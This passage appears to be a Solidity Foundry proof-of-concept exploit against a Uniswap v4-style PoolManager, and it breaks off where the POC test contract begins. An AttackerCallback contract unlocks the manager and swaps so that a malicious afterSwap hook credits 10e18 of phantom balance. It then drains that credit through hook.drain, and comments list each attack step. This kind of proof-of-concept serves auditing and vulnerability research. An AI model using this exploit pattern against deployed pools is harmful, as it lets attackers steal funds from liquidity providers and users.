// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import {PoolManager} from "../src/PoolManager.sol";
import {IPoolManager} from "../src/interfaces/IPoolManager.sol";
import {PoolKey} from "../src/types/PoolKey.sol";
import {Currency, CurrencyLibrary} from "../src/types/Currency.sol";
import {Hooks} from "../src/libraries/Hooks.sol";
import {TickMath} from "../src/libraries/TickMath.sol";
import {SwapParams, ModifyLiquidityParams} from "../src/types/PoolOperation.sol";
import {BalanceDelta} from "../src/types/BalanceDelta.sol";
import {MaliciousDeltaHook} from "./MaliciousDeltaHook.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";
import {MockERC20} from "../src/test/MockERC20.sol";

contract AttackerCallback {
    IPoolManager public manager;
    MaliciousDeltaHook public hook;
    PoolKey public key;
    address public owner;

    constructor(address _manager, address _hook) {
        manager = IPoolManager(_manager);
        hook = MaliciousDeltaHook(_hook);
        owner = msg.sender;
    }
    function setKey(PoolKey memory _k) external { key = _k; }

    function go() external {
        manager.unlock(abi.encode(1));
    }

    function unlockCallback(bytes calldata) external returns (bytes memory) {
        // Step 1: swap triggers afterSwap -> returns 10e18 phantom credit
        SwapParams memory params = SwapParams({
            zeroForOne: true,
            amountSpecified: -0.01e18,
            sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
        });
        manager.swap(key, params, "");

        // Step 3: drain phantom credit with take()
        // Step 4: PoolManager will think delta is 0, so unlock succeeds
        hook.drain(10e18);
        return "";
    }
}

contract POC is Test {
    using CurrencyLibrary for Currency;

    PoolManager manager;